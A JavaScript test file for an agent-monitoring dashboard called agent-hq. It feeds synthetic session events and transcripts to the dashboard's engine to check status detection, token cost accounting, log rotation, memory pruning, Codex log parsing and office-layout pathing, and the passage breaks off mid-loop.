// agent-hq test: runs the engine, hook and server against a throwaway home
// directory with synthetic events + transcripts. Prints PASS/FAIL per check.
'use strict';
const fs = require('fs'), path = require('path'), os = require('os'), http = require('http');
const { spawnSync, spawn } = require('child_process');
const CODE = __dirname;
const { createEngine, monthKey, dayKey } = require('./core');

const results = [];
function check(name, ok, detail = '') { results.push({ name, ok: !!ok }); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${!ok && detail ? '  -> ' + detail : ''}`); }
const approx = (a, b, eps = 1e-9) => Math.abs(a - b) < eps;

// ---------- temp home ----------
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-hq-test-'));
const HQ = path.join(HOME, '.agent-hq');
fs.mkdirSync(HQ, { recursive: true });
fs.copyFileSync(path.join(CODE, 'prices.json'), path.join(HQ, 'prices.json'));
const roster = {
  teams: ['Research', 'Content', 'Visuals', 'Ops'], dropIn: { team: 'Ops' },
  bots: [
    { id: 'hq', name: 'HQ', team: 'Ops', model: 'claude-opus-5-5', folders: ['~'], match: 'exact' },
    { id: 'nexus', name: 'Nexus', team: 'Visuals', model: 'claude-opus-5-5', folders: ['~/proj/nexus'] },
    { id: 'locqa', name: 'LocQA', team: 'Research', model: 'claude-sonnet-5-5', folders: ['~/proj/locqa'] },
    { id: 'tutor', name: 'Tutor', team: 'Content', folders: ['~/proj/tutor'] },
    { id: 'scratch', name: 'Scratch', team: 'Content', folders: ['~/proj/scratch'] },
    { id: 'gone', name: 'Gone', team: 'Ops', folders: ['~/proj/gone'] },
    { id: 'researcher', name: 'Researcher', team: 'Research', agentType: 'researcher', folders: [] },
  ],
};
fs.writeFileSync(path.join(HQ, 'roster.json'), JSON.stringify(roster));
for (const p of ['proj/nexus', 'proj/locqa', 'proj/tutor', 'proj/scratch', 'proj/gone']) fs.mkdirSync(path.join(HOME, p), { recursive: true });
const TX = path.join(HOME, 'transcripts'); fs.mkdirSync(TX);

const NOW = Date.now(), iso = sec => new Date(NOW - sec * 1000).toISOString();
const cwd = p => path.join(HOME, p);
const txp = id => path.join(TX, id + '.jsonl');
const events = [];
const ev = (sec, event, sid, folder, extra = {}) => events.push({ time: iso(sec), event, session_id: sid, cwd: cwd(folder), transcript_path: txp(sid), ...extra });
const lines = {};
const L = (sid, obj) => (lines[sid] ||= []).push(JSON.stringify(obj));
const asst = (sid, sec, id, content, usage, model = 'claude-opus-5-5') => L(sid, { type: 'assistant', timestamp: iso(sec), message: { id, model, content, usage } });
const user = (sid, sec, content) => L(sid, { type: 'user', timestamp: iso(sec), message: { role: 'user', content } });
const toolUse = (id, name, input) => ({ type: 'tool_use', id, name, input });
const toolRes = id => [{ type: 'tool_result', tool_use_id: id, content: 'ok' }];

// A working (LocQA) + token math
ev(120, 'SessionStart', 'loc', 'proj/locqa'); ev(60, 'UserPromptSubmit', 'loc', 'proj/locqa');
user('loc', 60, 'fix the tests');
asst('loc', 50, 'm1', [{ type: 'text', text: 'On it' }], { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 1000 }, 'claude-sonnet-5-5');
asst('loc', 50, 'm1', [toolUse('t1', 'Edit', { file_path: 'C:/x/server.js' })], { input_tokens: 10, output_tokens: 40, cache_read_input_tokens: 1000 }, 'claude-sonnet-5-5');
user('loc', 45, toolRes('t1'));
asst('loc', 5, 'm2', [{ type: 'text', text: 'Tests pass now.' }],
  { input_tokens: 3, output_tokens: 7, cache_creation_input_tokens: 3000, cache_creation: { ephemeral_5m_input_tokens: 2000, ephemeral_1h_input_tokens: 1000 } }, 'claude-sonnet-5-5');
L('loc', JSON.stringify({ type: 'assistant', timestamp: new Date(NOW - 3 * 86400000).toISOString(), message: { id: 'old', model: 'claude-sonnet-5-5', content: [], usage: { input_tokens: 99999, output_tokens: 99999 } } }).slice(0));
L('loc', '{this is not json');
// B running a command (Tutor): tool_use 15 min ago with no result -> running, never stuck
ev(1300, 'SessionStart', 'tut', 'proj/tutor'); ev(1200, 'UserPromptSubmit', 'tut', 'proj/tutor');
user('tut', 1200, 'build it');
asst('tut', 900, 'b1', [toolUse('tb', 'Bash', { command: 'npm run build', description: 'Build' })], { input_tokens: 1, output_tokens: 1 });
// C waiting (Nexus #1): permission prompt after the last line
ev(200, 'SessionStart', 'nx1', 'proj/nexus'); ev(120, 'UserPromptSubmit', 'nx1', 'proj/nexus');
user('nx1', 120, 'clean up');
asst('nx1', 60, 'n1', [toolUse('tn', 'Bash', { command: 'rm -rf build' })], { input_tokens: 1, output_tokens: 1 });
ev(59, 'Notification', 'nx1', 'proj/nexus', { notification_type: 'permission_prompt', message: 'Claude needs your permission to use Bash' });
// J second robot (Nexus #2): working
ev(100, 'SessionStart', 'nx2', 'proj/nexus'); ev(30, 'UserPromptSubmit', 'nx2', 'proj/nexus');
user('nx2', 30, [{ type: 'text', text: '<system-reminder>ignore me</system-reminder>' }, { type: 'text', text: 'Style the header and make the logo bigger on mobile please\nsecond line' }]); asst('nx2', 10, 'n2', [{ type: 'text', text: 'Styling' }], { input_tokens: 1, output_tokens: 2 });
// D waiting cleared by a newer transcript line (Scratch #1)
ev(200, 'SessionStart', 'sc1', 'proj/scratch'); ev(90, 'UserPromptSubmit', 'sc1', 'proj/scratch');
asst('sc1', 60, 's1', [toolUse('ts', 'Read', { file_path: 'C:/a/roster.json' })], { input_tokens: 1, output_tokens: 1 });
ev(55, 'Notification', 'sc1', 'proj/scratch', { notification_type: 'permission_prompt', message: 'perm' });
user('sc1', 40, toolRes('ts')); asst('sc1', 39, 's1b', [{ type: 'text', text: 'Read it' }], { input_tokens: 1, output_tokens: 1 });
// E waiting cleared by UserPromptSubmit (Scratch #2) — message-only permission (no type)
ev(400, 'SessionStart', 'sc2', 'proj/scratch'); ev(300, 'UserPromptSubmit', 'sc2', 'proj/scratch');
asst('sc2', 250, 's2', [{ type: 'text', text: 'x' }], { input_tokens: 1, output_tokens: 1 });
ev(240, 'Notification', 'sc2', 'proj/scratch', { message: 'Claude needs your permission to use Write' });
ev(20, 'UserPromptSubmit', 'sc2', 'proj/scratch'); user('sc2', 20, 'go on');
// F resting: Stop then idle notification (HQ); G stuck (drop-in folder)
ev(700, 'SessionStart', 'hq1', ''); ev(600, 'UserPromptSubmit', 'hq1', '');
asst('hq1', 560, 'h1', [{ type: 'text', text: 'All done, report saved.' }], { input_tokens: 1, output_tokens: 1 });
ev(550, 'Stop', 'hq1', '', { summary: 'All done, report saved.' });
ev(480, 'Notification', 'hq1', '', { notification_type: 'idle_prompt', message: 'Claude is waiting for your input' });
ev(1900, 'SessionStart', 'stk', 'side/thing'); ev(1800, 'UserPromptSubmit', 'stk', 'side/thing');
asst('stk', 720, 'k1', [{ type: 'text', text: 'Thinking hard' }], { input_tokens: 1, output_tokens: 1 });
// F2 idle notification without Stop (interrupted turn) -> resting, not waiting
ev(900, 'SessionStart', 'idl', 'proj/gone'); ev(800, 'UserPromptSubmit', 'idl', 'proj/gone');
asst('idl', 790, 'i1', [{ type: 'text', text: 'hm' }], { input_tokens: 1, output_tokens: 1 });
ev(700, 'Notification', 'idl', 'proj/gone', { notification_type: 'idle_prompt', message: 'Claude is waiting for your input' });
ev(650, 'SessionEnd', 'idl', 'proj/gone', { reason: 'other' });            // I off
// N missing transcript (session survives on events only)
events.push({ time: iso(30), event: 'SessionStart', session_id: 'nofile', cwd: cwd('proj/tutor'), transcript_path: path.join(TX, 'missing.jsonl') });
// O subagent (researcher) started by LocQA
ev(40, 'SubagentStart', 'loc', 'proj/locqa', { agent_id: 'abc123', agent_type: 'researcher' });
const subDir = path.join(TX, 'loc', 'subagents'); fs.mkdirSync(subDir, { recursive: true });
fs.writeFileSync(path.join(subDir, 'agent-abc123.jsonl'), [
  JSON.stringify({ type: 'assistant', timestamp: iso(20), message: { id: 'r1', model: 'claude-sonnet-5-5', content: [toolUse('tw', 'WebSearch', { query: 'three.js shadows' })], usage: { input_tokens: 100, output_tokens: 50 } } }),
].join('\n') + '\n');

for (const [sid, ls] of Object.entries(lines)) fs.writeFileSync(txp(sid), ls.join('\n') + '\n');
// L rotation: v1 legacy events.jsonl + a previous-month file
const prevMonth = (() => { const d = new Date(NOW); return monthKey(new Date(d.getFullYear(), d.getMonth() - 1, 15).getTime()); })();
const half = Math.floor(events.length / 2);
fs.writeFileSync(path.join(HQ, 'events.jsonl'), events.slice(0, half).map(e => JSON.stringify(e)).join('\n') + '\n{broken line\n');
fs.writeFileSync(path.join(HQ, `events-${monthKey(NOW)}.jsonl`), events.slice(half).map(e => JSON.stringify(e)).join('\n') + '\n');
fs.writeFileSync(path.join(HQ, `events-${prevMonth}.jsonl`), JSON.stringify({ time: new Date(NOW - 35 * 86400000).toISOString(), event: 'SessionStart', session_id: 'oldmonth', cwd: cwd('proj/gone') }) + '\n');

// ---------- engine checks ----------
const E = createEngine({ home: HOME, now: () => NOW });
const S = E.tick();
const bot = id => S.bots.find(b => b.id === id);
const robot = (id, i = 0) => (bot(id) || { robots: [] }).robots[i];

check('status: working (LocQA)', robot('locqa') && robot('locqa').status === 'working', JSON.stringify(robot('locqa') && robot('locqa').status));
const tr = robot('tutor');
check('status: running a command (Tutor, 15 min, not stuck)', tr && tr.status === 'running' && Math.abs(tr.runningSince - (NOW - 900000)) < 1000 && /Running Bash: npm run build/.test(tr.step), tr && tr.status + ' ' + tr.step);
check('status: waiting on permission prompt (Nexus)', robot('nexus', 0) && robot('nexus', 0).status === 'waiting' && S.waiting.some(w => w.label === 'Nexus' && /permission to use Bash/.test(w.message)));
const sc = bot('scratch').robots;
check('waiting clears on next transcript line', sc[0] && sc[0].status === 'working', sc[0] && sc[0].status);
check('waiting clears on UserPromptSubmit (message-only permission)', sc[1] && sc[1].status === 'working', sc[1] && sc[1].status);
check('status: resting after Stop + idle notification (HQ)', robot('hq') && robot('hq').status === 'resting' && !S.waiting.some(w => w.bot === 'HQ'));
const stk = S.bots.find(b => b.dropIn && /thing/.test(b.name));
check('status: stuck after 10 min without a line (drop-in)', stk && stk.robots[0] && stk.robots[0].status === 'stuck' && S.stuck.length === 1, stk && JSON.stringify(stk.robots.map(r => r.status)));
check('status: off after SessionEnd (desk empty)', bot('gone') && bot('gone').status === 'off' && bot('gone').robots.length === 0);
check('second robot in same folder is labelled "Nexus #2"', bot('nexus').robots.length === 2 && robot('nexus', 1).label === 'Nexus #2' && robot('nexus', 1).status === 'working');
check('header counts (running counts as working)', S.counts.working === 6 && S.counts.waiting === 1 && S.counts.stuck === 1 && S.counts.resting === 2 && S.counts.off >= 1, JSON.stringify(S.counts));

const tk = bot('locqa').tokens;
// m1 counted once with its largest usage (10 in / 40 out / 1000 cr), m2: 3 in / 7 out / 2000 cw5 / 1000 cw1; 'old' is from another day
const expIn = 13, expOut = 47, expCw = 3000, expCr = 1000;
const expCost = (13 * 2 + 47 * 10 + 2000 * 2.5 + 1000 * 4 + 1000 * 0.2) / 1e6;
check('tokens: input/output/cache kept separate, deduped by message id', tk.in === expIn && tk.out === expOut && tk.cw === expCw && tk.cr === expCr, JSON.stringify(tk));
check('tokens today = input + output (cache only in breakdown)', tk.total === expIn + expOut);
check('cost from prices.json (Sonnet 5.5, 5m vs 1h cache writes)', approx(tk.cost, expCost), `${tk.cost} vs ${expCost}`);
check('model chip follows the transcript (Sonnet 5.5)', bot('locqa').modelLabel === 'Sonnet 5.5');
check('totals = sum of bots', S.totals.total === S.bots.reduce((a, b) => a + b.tokens.total, 0) && approx(S.totals.cost, S.bots.reduce((a, b) => a + b.tokens.cost, 0)));
const res = bot('researcher');
check('subagent: helper robot next to the parent (LocQA)', robot('locqa').helpers.length === 1 && robot('locqa').helpers[0].type === 'researcher');
check('subagent: robot at its own desk + tokens count there', res.robots.length === 1 && res.robots[0].status === 'running' && res.tokens.in === 100 && res.tokens.out === 50, JSON.stringify(res.tokens));
check('task card: first line of the last prompt ("fix the tests")', robot('locqa').task === 'fix the tests', JSON.stringify(robot('locqa').task));
check('task card: system text ("<...") skipped, clipped to ~40 chars', robot('nexus', 1).task === 'Style the header and make the logo bigg…', JSON.stringify(robot('nexus', 1).task));
check('last actions parsed ("Edit server.js")', robot('locqa').actions.some(a => a.text === 'Edit server.js'));
check('malformed lines skipped, missing transcript survives', E._internals.sessions.has('nofile') && robot('tutor', 1) && robot('tutor', 1).status === 'resting');
check('rotation: legacy events.jsonl migrated into events-YYYY-MM.jsonl', !fs.existsSync(path.join(HQ, 'events.jsonl')) && fs.existsSync(path.join(HQ, 'events.v1-migrated.jsonl')) && E._internals.sessions.has('hq1'));
check('rotation: previous month file is read', E._internals.sessions.has('oldmonth'));
check('finished today comes from Stop events', S.finished.some(f => f.bot === 'HQ' && /All done/.test(f.summary)));
const TL = E.timeline();
const tlRow = id => TL.rows.find(r => r.botId === id);
check('timeline: bars per bot (Tutor working, Nexus waiting)', tlRow('tutor').segments.some(s => s[2] === 'working') && tlRow('nexus').segments.some(s => s[2] === 'waiting') && tlRow('hq').segments.some(s => s[2] === 'resting'));

// daily report (engine part + HTML), before the logs are deleted below
{
  const R = E.report(dayKey(NOW)), rb = id => R.bots.find(b => b.id === id) || {};
  check('report: per bot files edited / commands run (LocQA edited server.js, Tutor ran npm run build)', rb('locqa').files === 1 && rb('tutor').commands === 1 && rb('locqa').tokens.total === expIn + expOut, JSON.stringify([rb('locqa').files, rb('tutor').commands]));
  check('report: waited on me, got stuck (twice: silent 18 min, one line, silent again), tasks finished', rb('nexus').waits >= 1 && rb('nexus').waitSec > 0 && R.bots.some(b => b.dropIn && b.stuck === 2 && b.stuckSec > 0) && rb('hq').finished === 1 && R.totals.finished >= 1, JSON.stringify([rb('nexus').waits, rb('hq').finished]));
  check('report: timeline segments + only bots with activity', rb('tutor').segments && rb('tutor').segments.some(x => x[2] === 'working') && !R.bots.some(b => b.id === 'gone' && !b.activeSec && !b.tokens.total), JSON.stringify(R.bots.map(b => b.id)));
  const { writeReport } = require('./report');
  const w = writeReport(dayKey(NOW), { home: HOME });
  const html = fs.readFileSync(w.file, 'utf8');
  check('report: ~/.agent-hq/reports/YYYY-MM-DD.html written, self-contained (no scripts, no external URLs)', path.resolve(w.file) === path.resolve(HQ, 'reports', dayKey(NOW) + '.html') && /LocQA/.test(html) && /Timeline/.test(html) && !/<script/i.test(html) && !/(src|href)=["']https?:/i.test(html));
}

// subagent stop + transcript deletion robustness
fs.appendFileSync(path.join(HQ, `events-${monthKey(NOW)}.jsonl`), JSON.stringify({ time: iso(1), event: 'SubagentStop', session_id: 'loc', cwd: cwd('proj/locqa'), agent_id: 'abc123', agent_type: 'researcher', agent_transcript_path: path.join(subDir, 'agent-abc123.jsonl') }) + '\n');
fs.unlinkSync(txp('nx2'));
const S2 = E.tick();
check('subagent: helper disappears after SubagentStop', S2.bots.find(b => b.id === 'locqa').robots[0].helpers.length === 0 && S2.bots.find(b => b.id === 'researcher').robots.length === 0);
check('deleted transcript does not crash, data kept', S2.bots.find(b => b.id === 'nexus').robots.length === 2);

// stats survive rotation
E.persistStats(true);
const statFile = path.join(HQ, 'stats', dayKey(NOW) + '.json');
const old = new Date(NOW); old.setDate(old.getDate() - 3);
fs.writeFileSync(path.join(HQ, 'stats', dayKey(old.getTime()) + '.json'), JSON.stringify({ date: dayKey(old.getTime()), final: true, bots: { locqa: { name: 'LocQA', in: 5, out: 5, total: 10, cost: 1.5 } }, total: { total: 10, cost: 1.5 } }));
E.close();   // release kept file handles before deleting the files
for (const f of fs.readdirSync(HQ)) if (/^events/.test(f)) fs.unlinkSync(path.join(HQ, f));
fs.rmSync(TX, { recursive: true, force: true });
const E2 = createEngine({ home: HOME, now: () => NOW });
const ST = E2.stats(7);
const todayAgg = ST.days[ST.days.length - 1];
check('stats: daily file written (stats/YYYY-MM-DD.json)', fs.existsSync(statFile));
check('stats: history survives deleted events + transcripts', todayAgg.bots.locqa && todayAgg.bots.locqa.total === expIn + expOut && ST.days.length === 7 && ST.days[3].bots.locqa && ST.days[3].bots.locqa.cost === 1.5);
check('stats: busiest bot today', ST.busiestToday && ST.busiestToday.botId === 'researcher', JSON.stringify(ST.busiestToday));

// ---------- memory: bounded arrays + pruning (10,000 synthetic events over 3 days) ----------
{
  const MEM = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-hq-mem-'));
  const MHQ = path.join(MEM, '.agent-hq'); fs.mkdirSync(MHQ, { recursive: true });
  fs.copyFileSync(path.join(CODE, 'prices.json'), path.join(MHQ, 'prices.json'));
  fs.writeFileSync(path.join(MHQ, 'roster.json'), JSON.stringify({ teams: ['Ops', 'Research'], bots: [
    { id: 'm1', name: 'Marathon', team: 'Ops', folders: ['~/w/m1'] }, { id: 'm2', name: 'Shorty', team: 'Research', folders: ['~/w/m2'] },
    { id: 'rs', name: 'Researcher', team: 'Research', agentType: 'researcher', folders: [] }] }));
  const T = (() => { const d = new Date(); d.setHours(18, 0, 0, 0); return d.getTime(); })();   // "now" = today 18:00 local
  const D0 = (() => { const d = new Date(T); d.setHours(0, 0, 0, 0); return d.getTime(); })();
  const MTX = path.join(MEM, 'tx'); fs.mkdirSync(MTX);
  const evs = {}, txs = {}; let count = 0, k = 0;
  const E_ = (t, event, sid, folder, x = {}) => { (evs[monthKey(t)] ||= []).push(JSON.stringify({ time: new Date(t).toISOString(), event, session_id: sid, cwd: path.join(MEM, 'w', folder), transcript_path: path.join(MTX, sid + '.jsonl'), ...x })); count++; };
  const L_ = (sid, t, obj) => { (txs[sid] ||= []).push(JSON.stringify({ timestamp: new Date(t).toISOString(), ...obj })); count++; };
  const A_ = (sid, t, content) => L_(sid, t, { type: 'assistant', message: { id: `${sid}-${k++}`, model: 'claude-sonnet-5-5', content, usage: { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 100 } } });
  // two past days: 30 short sessions each (start, prompt, 30 lines, Stop, SessionEnd)
  for (const day of [2, 1]) for (let i = 0; i < 30; i++) {
    const sid = `p${day}-${i}`, t0 = D0 - day * 86400000 + 9 * 3600000 + i * 600000, f = i % 2 ? 'm1' : 'm2';
    E_(t0, 'SessionStart', sid, f); E_(t0 + 1000, 'UserPromptSubmit', sid, f);
    for (let j = 0; j < 30; j++) A_(sid, t0 + 2000 + j * 4000, j % 2 ? [{ type: 'text', text: 'step ' + j }] : [{ type: 'tool_use', id: `${sid}t${j}`, name: 'Read', input: { file_path: 'a.js' } }]);
    E_(t0 + 130000, 'Stop', sid, f, { summary: 'done' }); E_(t0 + 140000, 'SessionEnd', sid, f);
  }
  // today: one marathon session, a line every 4 s from 09:00 to 18:00, a turn every 10 min, plus a subagent
  const mar = 'marathon'; E_(D0 + 9 * 3600000 - 5000, 'SessionStart', mar, 'm1');
  for (let t = D0 + 9 * 3600000, j = 0; t < T; t += 4000, j++) {
    if (j % 150 === 0) { E_(t, 'UserPromptSubmit', mar, 'm1'); L_(mar, t, { type: 'user', message: { role: 'user', content: 'turn ' + j } }); continue; }
    if (j % 150 === 149) { A_(mar, t, [{ type: 'text', text: 'turn done ' + j }]); E_(t + 1, 'Stop', mar, 'm1', { summary: 'turn done ' + j }); continue; }
    A_(mar, t, [{ type: 'text', text: 'line ' + j }]);
  }
  const lastPrompt = D0 + 9 * 3600000 + Math.floor((T - 1 - (D0 + 9 * 3600000)) / 600000) * 600000;
  E_(T - 400000, 'SubagentStart', mar, 'm1', { agent_id: 'sub1', agent_type: 'researcher' });
  // today: 10 short sessions that already ended
  for (let i = 0; i < 10; i++) { const sid = `t-${i}`, t0 = D0 + 8 * 3600000 + i * 1800000; E_(t0, 'SessionStart', sid, 'm2'); E_(t0 + 1000, 'UserPromptSubmit', sid, 'm2'); for (let j = 0; j < 20; j++) A_(sid, t0 + 2000 + j * 3000, [{ type: 'text', text: 'x' }]); E_(t0 + 70000, 'Stop', sid, 'm2', { summary: 'ok' }); E_(t0 + 80000, 'SessionEnd', sid, 'm2'); }
  for (const [m, ls] of Object.entries(evs)) fs.writeFileSync(path.join(MHQ, `events-${m}.jsonl`), ls.sort().join('\n') + '\n');
  for (const [sid, ls] of Object.entries(txs)) fs.writeFileSync(path.join(MTX, sid + '.jsonl'), ls.join('\n') + '\n');
  const subTx = path.join(MTX, mar, 'subagents'); fs.mkdirSync(subTx, { recursive: true });
  fs.writeFileSync(path.join(subTx, 'agent-sub1.jsonl'), Array.from({ length: 200 }, (_, j) => JSON.stringify({ type: 'assistant', timestamp: new Date(T - 390000 + j * 1000).toISOString(), message: { id: 'sb' + j, model: 'claude-sonnet-5-5', content: [{ type: 'tool_use', id: 'st' + j, name: 'WebSearch', input: { query: 'q' } }], usage: { input_tokens: 3, output_tokens: 2 } } })).join('\n') + '\n');
  count += 200;
  // two copies of the same home: A keeps everything (old behaviour), B prunes + compacts
  const MEM2 = MEM + '-b'; fs.cpSync(MEM, MEM2, { recursive: true });
  const fixHome = (src, dst) => { for (const f of fs.readdirSync(path.join(dst, '.agent-hq'))) if (/^events-/.test(f)) { const p = path.join(dst, '.agent-hq', f); let t = fs.readFileSync(p, 'utf8').split(src).join(dst); if (src.includes('\\')) t = t.split(src.replace(/\\/g, '\\\\')).join(dst.replace(/\\/g, '\\\\')); fs.writeFileSync(p, t); } };   // the JSON-escaped form exists only with backslashes; on POSIX a second pass would rewrite dst again
  fixHome(MEM, MEM2);
  const warmUp = E => { for (let i = 0; i < 200; i++) { E.tick(); if (!E.backlog()) break; } };
  const EA = createEngine({ home: MEM, now: () => T }); warmUp(EA); EA.persistStats(true);
  const EB = createEngine({ home: MEM2, now: () => T }); warmUp(EB); EB.persistStats(true);
  const before = EB.memStats();
  const r = EB.maintain(); EB.maintain();
  const after = EB.memStats(), SB = EB.tick(), SA = EA.tick();
  const mB = EB._internals.sessions.get(mar);
  check(`memory: ${count.toLocaleString('en-US')} synthetic events read (3 days, 71 sessions)`, count >= 10000 && before.sessions === 71, `${count} events, ${before.sessions} sessions`);
  check('memory: sessions that ended before today are dropped from memory', after.sessions === 11 && r.pruned >= 60 && !EB._internals.sessions.has('p2-0'), JSON.stringify({ r, after }));
  const lim = 2 * Math.ceil((T - D0) / 60000) + 12 * 20 + 8;
  check(`memory: arrays stay bounded (marathon lines ${mB.lines.length} of ${EA._internals.sessions.get(mar).lines.length}, every list <= ${lim})`,
    ['lines', 'pend', 'allEv', 'prompts', 'rests'].every(k2 => mB[k2].length <= lim) && mB.lines.length < 3000 && mB.lines.length === mB.pend.length && mB.usage.size <= 16 && after.finished <= 200 && after.arrayItems < before.arrayItems / 2,
    JSON.stringify({ lines: mB.lines.length, allEv: mB.allEv.length, usage: mB.usage.size, after }));
  const tokA = Object.fromEntries(SA.bots.map(b => [b.id, b.tokens])), tokB = Object.fromEntries(SB.bots.map(b => [b.id, b.tokens]));
  check('pruning: today\'s tokens per bot unchanged (folded usage)', ['m1', 'm2', 'rs'].every(id => ['in', 'out', 'cw', 'cr', 'total'].every(f => tokA[id][f] === tokB[id][f]) && approx(tokA[id].cost, tokB[id].cost, 1e-9)) && tokA.m1.total > 0, JSON.stringify({ tokA, tokB }));
  const tlA = EA._internals.timelineFor(D0, T + 1).seconds, tlB = EB._internals.timelineFor(D0, T + 1).seconds;
  check('pruning: today\'s timeline seconds unchanged (full resample after compaction)', JSON.stringify(tlA) === JSON.stringify(tlB) && tlA.m1.working > 0, JSON.stringify({ tlA: tlA.m1, tlB: tlB.m1 }));
  const stA = s => s.bots.map(b => b.robots.map(x => [x.key, x.status, x.turn && x.turn.requested, x.turn && x.turn.working]).join()).join('|');
  check('pruning: live statuses + current turn unchanged', stA(SA) === stA(SB) && SB.bots.find(b => b.id === 'm1').robots[0].turn.requested === lastPrompt, stA(SB).slice(0, 200));
  const readDay = (home, off) => JSON.parse(fs.readFileSync(path.join(home, '.agent-hq', 'stats', dayKey(D0 - off * 86400000) + '.json'), 'utf8'));
  const dA = [2, 1, 0].map(o => readDay(MEM, o)), dB = [2, 1, 0].map(o => readDay(MEM2, o));
  check('pruning: past days final in stats files before they leave memory; same totals', dB[0].final && dB[1].final && !dB[2].final && [0, 1, 2].every(i => dA[i].total.total === dB[i].total.total && dA[i].total.total > 0), JSON.stringify(dB.map(d => [d.date, d.final, d.total.total])));
  EB.persistToday(); const todayB = readDay(MEM2, 0);
  check('pruning: today\'s stats file after pruning matches the unpruned engine', todayB.total.total === dA[2].total.total && JSON.stringify(todayB.bots.m1.seconds) === JSON.stringify(dA[2].bots.m1.seconds), JSON.stringify([todayB.bots.m1, dA[2].bots.m1]));
  EA.close();
  for (const d of [MEM, MEM2]) fs.rmSync(d, { recursive: true, force: true });
}

// ---------- Codex (read-only rollout logs) ----------
const { writeCodexSession } = require('./fixtures');
const CX = fs.mkdtempSync(path.join(os.tmpdir(), 'agent-hq-codex-'));
fs.mkdirSync(path.join(CX, '.agent-hq'), { recursive: true });
fs.copyFileSync(path.join(CODE, 'prices.json'), path.join(CX, '.agent-hq', 'prices.json'));
fs.writeFileSync(path.join(CX, '.agent-hq', 'roster.json'), JSON.stringify({ teams: ['Ops', 'Codex'], dropInCodex: { team: 'Codex' }, bots: [
  { id: 'cl', name: 'ClaudeHere', team: 'Ops', source: 'claude', folders: ['~/p/shared'] },
  { id: 'cw', name: 'CxWork', team: 'Codex', source: 'codex', folders: ['~/p/work'] },
  { id: 'cr', name: 'CxRun', team: 'Codex', source: 'codex', folders: ['~/p/run'] },
  { id: 'cs', name: 'CxRest', team: 'Codex', source: 'codex', folders: ['~/p/rest'] },
  { id: 'ca', name: 'CxAsk', team: 'Codex', source: 'codex', folders: ['~/p/ask'] },
  { id: 'co', name: 'CxOld', team: 'Codex', source: 'codex', folders: ['~/p/old'] },
  { id: 'csh', name: 'CxShared', team: 'Codex', source: 'codex', folders: ['~/p/shared'] }] }));
const cxNow = Date.now();
for (const [id, dir, state, at] of [['w', 'work', 'working', cxNow], ['r', 'run', 'running', cxNow], ['s', 'rest', 'resting', cxNow], ['a', 'ask', 'waiting', cxNow], ['o', 'old', 'resting', cxNow - 40 * 60000], ['sh', 'shared', 'working', cxNow], ['u', 'unlisted', 'working', cxNow]])
  writeCodexSession(CX, { id: 'cx-' + id, cwd: path.join(CX, 'p', dir), now: at, state });
const snapshot = dir => { const out = []; const walk = d => { for (const f of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, f.name); if (f.isDirectory()) walk(p); else { const st = fs.statSync(p); out.push(`${p}|${st.size}|${st.mtimeMs}`); } } }; walk(dir); return out.sort().join('\n'); };
const before = snapshot(path.join(CX, '.codex'));
const EC = createEngine({ home: CX, now: () => cxNow });
const SC = EC.tick(); EC.tick();
const cb = id => SC.bots.find(b => b.id === id), cst = id => (cb(id) && cb(id).robots[0] || {}).status || (cb(id) && cb(id).status);
check('codex: working / running a command / resting / waiting', cst('cw') === 'working' && cst('cr') === 'running' && cst('cs') === 'resting' && cst('ca') === 'waiting', ['cw', 'cr', 'cs', 'ca'].map(cst).join(','));
check('codex: idle thread (40 min, no SessionEnd) is off', cb('co') && cb('co').status === 'off' && cb('co').robots.length === 0);
check('codex: approval request shows the command', SC.waiting.some(w => w.botId === 'ca' && /git push/.test(w.message)));
const ct = cb('cw').tokens;   // totals 15000 in (8000 cached) / 500 out; repeated token_count lines must not double count
check('codex: tokens from token_count deltas (in excl. cache, cache read separate, no double count)', ct.in === 7000 && ct.out === 500 && ct.cr === 8000 && ct.total === 7500, JSON.stringify(ct));
check('codex: model chip "OpenAI · gpt-6.1-sol", unpriced', cb('cw').modelLabel === 'OpenAI · gpt-6.1-sol' && ct.unpriced === true && ct.cost === 0);
check('codex: matched by folder + source (same folder as a Claude bot stays Codex)', cb('csh').robots.length === 1 && cb('cl').robots.length === 0);
check('codex: unlisted folder becomes a Codex drop-in in the Codex lab', SC.bots.some(b => b.dropIn && b.source === 'codex' && b.team === 'Codex' && b.robots.length === 1));
check('codex: task_complete lands in "finished today"', SC.finished.some(f => f.botId === 'cs' && f.summary === 'hi'));
check('codex: task card from the last user message ("say hi")', cb('cs').robots[0].task === 'say hi', JSON.stringify(cb('cs').robots[0].task));
check('codex: last actions parsed ("Shell: npm test")', cb('cs').robots[0].actions.some(a => a.text === 'Shell: npm test'));
check('codex: ~/.codex is never written', snapshot(path.join(CX, '.codex')) === before);
EC.close(); fs.rmSync(CX, { recursive: true, force: true });

// ---------- office layout + walking paths (same ES modules the page uses) ----------
async function layoutChecks() {
  const { computeLayout } = await import('file:///' + path.join(CODE, 'web', 'layout.js').replace(/\\/g, '/'));
  const { NavGrid } = await import('file:///' + path.join(CODE, 'web', 'nav.js').replace(/\\/g, '/'));
  const teams = ['Research', 'Content', 'Visuals', 'Ops', 'Codex'];
  const bots = [['a', 'Research', 2], ['b', 'Research', 1], ['c', 'Content', 1], ['d', 'Content', 1], ['e', 'Content', 1], ['f', 'Visuals', 3], ['g', 'Visuals', 1], ['h', 'Ops', 1], ['i', 'Ops', 1], ...'jklmno'.split('').map(x => [x, 'Codex', 1])].map(([id, team, seats]) => ({ id, team, seats }));
  const L = computeLayout(teams, bots); const G = new NavGrid(L);
  const spots = [...L.desks.map(d => d.seat), ...L.queue, ...L.meeting.seats, ...L.lounge.sofaSeats, ...L.lounge.coffeeSpots, L.lounge.armSeat, ...L.lounge.stand, L.lead.reportSpot, L.boardSpot, L.inside];
  let unreachable = 0, clipped = 0, maxMs = 0;
  for (const s of spots) {
    const t0 = Date.now(); const p = G.path(L.spawn, s); maxMs = Math.max(maxMs, Date.now() - t0);
    if (!p) { unreachable++; continue; }
    // every segment of the walk, except stepping into / out of the chair at the ends, must stay on free cells
    for (let i = 0; i + 1 < p.length; i++) for (let k = 0; k <= 20; k++) {
      const x = p[i].x + (p[i + 1].x - p[i].x) * k / 20, z = p[i].z + (p[i + 1].z - p[i].z) * k / 20;
